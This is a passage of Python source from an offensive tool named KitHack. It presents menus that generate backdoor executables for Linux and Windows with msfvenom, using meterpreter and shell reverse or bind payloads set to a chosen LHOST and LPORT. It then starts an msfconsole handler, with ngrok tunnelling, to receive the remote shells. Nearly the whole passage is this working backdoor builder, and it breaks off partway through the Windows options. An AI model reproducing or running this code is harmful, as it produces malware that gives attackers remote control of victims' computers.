			print ('{0}[07]{1} linux/x86/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[08]{1} linux/x86/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[09]{1} linux/x86/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[10]{1} linux/x86/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[11]{1} linux/x86/shell_bind_tcp'.format(WHITE, YELLOW))
			print ('{0}[12]{1} linux/x86/shell_reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)
			
			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:						
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] AN ERROR HAS OCCURED WHILST GENERATING THE PAYLOAD\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()	
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()			

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()	
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()		
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '07':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))	
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '08':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()				

			elif pay == '09':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '10':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '11':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '12':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] INVALID OPTION\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '02':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} windows/x64/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} windows/x64/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} windows/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} windows/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} windows/x64/powershell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} windows/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[07]{1} windows/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[08]{1} windows/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[09]{1} windows/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[10]{1} windows/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[11]{1} windows/meterpreter/reverse_tcp_dns'.format(WHITE, YELLOW))
			print ('{0}[12]{1} windows/metsvc_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[13]{1} windows/powershell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[14]{1} windows/shell_reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()						

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
